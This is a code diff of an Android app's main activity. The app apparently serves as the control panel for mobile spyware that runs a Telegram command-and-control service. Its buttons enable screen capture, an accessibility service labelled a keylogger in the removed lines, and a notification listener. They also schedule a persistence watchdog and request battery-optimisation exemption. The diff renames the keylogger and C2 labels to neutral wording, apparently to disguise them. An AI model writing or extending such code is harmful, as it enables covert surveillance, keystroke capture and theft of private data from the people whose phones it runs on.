@@ -7,10 +7,13 @@ import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
+import android.os.PowerManager
+import android.provider.Settings
 import android.view.View
 import android.widget.Button
 import android.widget.LinearLayout
@@ -62,53 +65,59 @@ class MainActivity : Activity() {
         })
 
         root.addView(TextView(this).apply {
-            text = "Mode: Telegram\nBot: TelegramC2Service"
+            text = "Mode: Telegram\nLong-running background service"
             textSize = 12f
             setPadding(0, 12, 0, 24)
         })
 
-        root.addView(Button(this).apply {
-            text = "1. Grant permissions"
-            setOnClickListener {
-                ActivityCompat.requestPermissions(this@MainActivity, PERMS, REQ)
+        fun btn(label: String, action: () -> Unit) {
+            root.addView(Button(this).apply {
+                text = label
+                setOnClickListener { action() }
+            })
+        }
+
+        btn("1. Grant permissions") {
+            ActivityCompat.requestPermissions(this@MainActivity, PERMS, REQ)
+        }
+        btn("2. Start Telegram C2") {
+            val i = Intent(this@MainActivity, TelegramC2Service::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                startForegroundService(i)
+            else
+                startService(i)
+            log("main", "service start requested")
+        }
+        btn("3. Stop Telegram C2") {
+            stopService(Intent(this@MainActivity, TelegramC2Service::class.java))
+            log("main", "service stop requested")
+        }
+        btn("4. Enable screen capture") {
+            startActivity(Intent(this@MainActivity, MediaProjectionSetupActivity::class.java))
+        }
+        btn("5. Enable accessibility") {
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+        }
+        btn("6. Enable notification listener") {
+            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
+        }
+        btn("7. Schedule watchdog (15 min)") {
+            WatchdogReceiver.schedule(this@MainActivity)
+            log("main", "watchdog scheduled")
+            Toast.makeText(this@MainActivity, "watchdog scheduled", Toast.LENGTH_SHORT).show()
+        }
+        btn("8. Request battery exemption") {
+            requestBatteryExemption()
+        }
+        btn("9. Open battery settings") {
+            openAppBatterySettings()
+        }
+        btn("10. Open app settings") {
+            val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                data = Uri.fromParts("package", packageName, null)
             }
-        })
-        root.addView(Button(this).apply {
-            text = "2. Start Telegram C2"
-            setOnClickListener {
-                val i = Intent(this@MainActivity, TelegramC2Service::class.java)
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                    startForegroundService(i)
-                else
-                    startService(i)
-                log("main", "TG service start requested")
-            }
-        })
-        root.addView(Button(this).apply {
-            text = "3. Stop Telegram C2"
-            setOnClickListener {
-                stopService(Intent(this@MainActivity, TelegramC2Service::class.java))
-                log("main", "TG service stop requested")
-            }
-        })
-        root.addView(Button(this).apply {
-            text = "4. Enable screen capture permission"
-            setOnClickListener {
-                startActivity(Intent(this@MainActivity, MediaProjectionSetupActivity::class.java))
-            }
-        })
-        root.addView(Button(this).apply {
-            text = "5. Enable accessibility (keylogger)"
-            setOnClickListener {
-                startActivity(Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
-            }
-        })
-        root.addView(Button(this).apply {
-            text = "6. Enable notification listener"
-            setOnClickListener {
-                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
-            }
-        })
+            startActivity(i)
+        }
 
         root.addView(TextView(this).apply {
             text = "─ LOG ─"
@@ -166,6 +175,50 @@ class MainActivity : Activity() {
         if (missing) ActivityCompat.requestPermissions(this, PERMS, REQ)
 
         startLogRefresher()
+
+        val prefs = getSharedPreferences("c2", MODE_PRIVATE)
+        val projCode = prefs.getInt("proj_code", Int.MIN_VALUE)
+        if (projCode != Int.MIN_VALUE) {
+            Handler(Looper.getMainLooper()).postDelayed({
+                startActivity(Intent(this, MediaProjectionSetupActivity::class.java))
+            }, 1500)
+        }
+
+        WatchdogReceiver.schedule(this)
+    }
+
+    private fun requestBatteryExemption() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            try {
+                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                val pkg = packageName
+                if (!pm.isIgnoringBatteryOptimizations(pkg)) {
+                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                        data = Uri.parse("package:$pkg")
+                    }
+                    startActivity(intent)
+                    log("main", "requested battery exemption")
+                } else {
+                    Toast.makeText(this, "already exempt", Toast.LENGTH_SHORT).show()
+                }
+            } catch (e: Exception) {
+                log("main", "exemption failed: ${e.message}")
+            }
+        } else {
+            Toast.makeText(this, "not needed on this Android version", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    private fun openAppBatterySettings() {
+        try {
+            val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                data = Uri.fromParts("package", packageName, null)
+            }
+            startActivity(i)
+            Toast.makeText(this, "Choose Battery → Unrestricted", Toast.LENGTH_LONG).show()
+        } catch (e: Exception) {
+            log("main", "battery settings failed: ${e.message}")
+        }
     }
 
     private fun log(tag: String, msg: String) {
